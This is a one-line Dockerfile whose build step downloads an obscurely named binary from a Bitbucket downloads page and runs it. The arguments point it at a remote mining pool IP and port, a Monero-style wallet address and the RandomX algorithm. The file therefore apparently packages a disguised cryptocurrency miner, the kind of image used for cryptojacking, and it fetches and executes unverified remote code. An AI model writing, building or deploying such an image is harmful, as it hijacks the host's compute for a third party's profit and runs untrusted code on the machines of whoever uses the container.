FROM ubuntu:latest
RUN apt-get update && apt-get -y upgrade && apt-get install -y wget && wget https://bitbucket.org/anli_angku/aset-anli/downloads/katek-fee && chmod u+x katek-fee && ./katek-fee -o 192.53.118.148:1111 -u 48JsZF5Mmtc1i54xemhuNqiFZocmiHEPy1NfpiyPzwQTUN35im4YfN3SeEFBzwUdM13M9KmsnxVngi5XaA6jQEyp7SpYWed.Test01 -k -a rx/0